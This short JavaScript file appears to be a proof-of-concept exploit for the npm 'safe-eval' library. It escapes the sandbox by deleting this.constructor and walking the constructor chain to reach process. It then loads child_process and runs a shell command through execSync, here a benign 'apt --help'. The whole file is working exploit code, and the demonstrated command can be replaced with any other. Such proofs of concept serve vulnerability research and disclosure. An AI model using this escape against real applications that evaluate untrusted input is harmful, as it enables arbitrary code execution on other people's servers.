const safeEval = require("safe-eval");

const code = `( ${() => {
    delete this.constructor;
    return this.constructor
    .constructor("return process")()
    .mainModule.require("child_process")
    .execSync("apt --help").toString();
 }} )()`;

console.log(safeEval(code));
